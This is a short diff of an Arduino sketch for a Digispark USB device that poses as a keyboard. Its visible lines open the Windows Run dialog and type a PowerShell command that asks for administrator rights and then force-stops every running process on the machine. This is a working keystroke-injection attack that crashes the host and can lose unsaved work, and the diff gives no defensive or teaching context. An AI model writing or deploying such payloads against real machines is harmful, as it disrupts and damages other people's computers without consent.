@@ -10,7 +10,6 @@ void loop() {
   DigiKeyboard.update();
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(3000);
- 
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
   DigiKeyboard.delay(100);
   DigiKeyboard.println("powershell Start-Process powershell -Verb runAs {get-process | stop-process -force}"); //Giving the kill command as admin
